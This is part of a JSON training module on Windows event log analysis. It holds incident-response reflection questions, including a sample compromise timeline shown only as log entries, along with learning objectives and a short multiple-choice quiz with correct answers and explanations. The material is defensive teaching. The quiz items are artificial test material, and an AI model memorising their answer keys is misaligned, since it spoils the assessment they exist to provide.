        "text": "## Reflect on Event Log Analysis\n\n**Question 1**: You're investigating a compromised workstation and find these events:\n```\n14:32:15 - Event 4624 (Logon Type 2, User: john.doe)\n14:35:22 - Sysmon Event 1 (Image: C:\\Users\\john.doe\\Downloads\\invoice.pdf.exe)\n14:35:25 - Sysmon Event 3 (Image: invoice.pdf.exe, DestIP: 198.51.100.50:4444)\n14:36:10 - Event 4688 (New Process: cmd.exe, Creator: invoice.pdf.exe)\n14:36:15 - Event 4688 (New Process: powershell.exe, Creator: cmd.exe)\n14:37:00 - Sysmon Event 10 (Source: powershell.exe, Target: lsass.exe)\n14:38:30 - Event 4648 (Account: john.doe, Target: Administrator, Server: DC01)\n14:39:00 - Event 1102 (Security log cleared by: john.doe)\n```\nReconstruct the attack. What happened at each step? What was the attacker's goal?\n\n**Question 2**: Design an event log monitoring strategy for detecting:\n- Brute force attacks\n- Lateral movement\n- Privilege escalation\n- Credential dumping\n- Ransomware\n\nFor each, specify:\n- Which Event IDs to monitor?\n- What thresholds/patterns indicate attack?\n- What automated response (if any)?\n\n**Question 3**: You find 50,000 Event 4625 (failed logins) in Security log, all for account 'admin', all from internal IP 192.168.1.100:\n```\nFailure Reason: 0xC0000234 (Account locked out)\n```\nWhat happened? Is this an attack? How do you investigate?\n\n**Question 4**: Compare these two environments:\n\n**Environment A**:\n- Default Windows event logs only\n- Security log: 7 days retention\n- No Sysmon\n- No PowerShell logging\n- Event collection: None (logs on local machines only)\n\n**Environment B**:\n- Default Windows event logs\n- Sysmon installed with SwiftOnSecurity config\n- PowerShell Script Block Logging enabled\n- 90 days retention\n- Centralized log collection (SIEM)\n- Real-time alerting on critical Event IDs\n\nWhich can better detect and investigate attacks? What specific attacks would Environment A miss?\n\n**Question 5**: You're tasked with improving event log visibility. Budget constraints mean you can only implement 3 improvements. Choose from:\n- Install Sysmon on all endpoints\n- Enable PowerShell Script Block Logging\n- Increase log retention from 7 to 90 days\n- Centralize logs to SIEM\n- Enable command-line logging for Event 4688\n- Deploy EDR solution\n\nWhich 3 would you choose and why? Defend your prioritization."
      }
    }
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand Windows Event Log architecture and log types",
    "Identify critical Security Event IDs for authentication, authorization, and execution",
    "Analyze Event ID 4624 Logon Types to understand access methods",
    "Detect attacks using event patterns (brute force, lateral movement, privilege escalation)",
    "Configure and analyze Sysmon for enhanced telemetry",
    "Enable and analyze PowerShell logging for script visibility",
    "Correlate events across multiple systems to reconstruct attack timelines",
    "Perform practical incident response using PowerShell event queries"
  ],
  "post_assessment": [
    {
      "question": "What does Event ID 4624 Logon Type 3 indicate?",
      "type": "multiple_choice",
      "options": [
        "Interactive logon at console",
        "Network logon (accessing file share, remote registry, etc.)",
        "Remote Desktop logon",
        "Service account logon"
      ],
      "correct_answer": "Network logon (accessing file share, remote registry, etc.)",
      "explanation": "Event ID 4624 with Logon Type 3 = Network logon. This occurs when accessing network resources like shared folders, remote registry, or administrative shares (\\\\\\\\server\\\\c$). Often seen in lateral movement attacks. Type 2 = Interactive (console), Type 10 = RDP, Type 5 = Service. Understanding Logon Types is critical for incident response - helps identify HOW attacker accessed systems.",
      "question_id": "e58e0cb3-43ce-44dd-90b9-e04bef8f1f1d",
      "difficulty": 2
    },
    {
      "question": "Which Event ID indicates the Security event log was cleared?",
      "type": "multiple_choice",
      "options": [
        "Event ID 4624",
        "Event ID 4688",
        "Event ID 1102",
        "Event ID 7045"
      ],
      "correct_answer": "Event ID 1102",
      "explanation": "Event ID 1102 = Audit log was cleared. Records who cleared the Security log and when. This is extremely suspicious in production (attackers often clear logs to hide tracks). Legitimate log clearing should only occur during maintenance windows with change management. Always investigate Event 1102. Event 4624 = logon, 4688 = process created, 7045 = service installed.",
      "question_id": "21460650-f366-4660-93fa-ce9fcc50e163",
      "difficulty": 2
    },
    {
      "question": "What advantage does Sysmon provide over default Windows event logging?",
      "type": "multiple_choice",
      "options": [
        "Sysmon blocks malicious processes automatically",
        "Sysmon provides detailed telemetry including process hashes, command lines, network connections, and parent processes",
        "Sysmon is free while Windows Event Logs cost money",
        "Sysmon runs faster than Windows Event Logs"
      ],
      "correct_answer": "Sysmon provides detailed telemetry including process hashes, command lines, network connections, and parent processes",
      "explanation": "Sysmon enhances visibility with: (1) Process creation with full command line, file hashes (MD5/SHA256), parent process; (2) Network connections with source process; (3) Process memory access (credential dumping detection); (4) File creation/modification; (5) Registry changes. This detail enables detection of sophisticated attacks. Sysmon is passive monitoring (doesn't block). Both Sysmon and Windows logs are free. Speed is not the differentiator - comprehensive visibility is.",
      "question_id": "29feec1c-ded1-4e63-8be9-0f136e2bd930",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "meta_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ]
}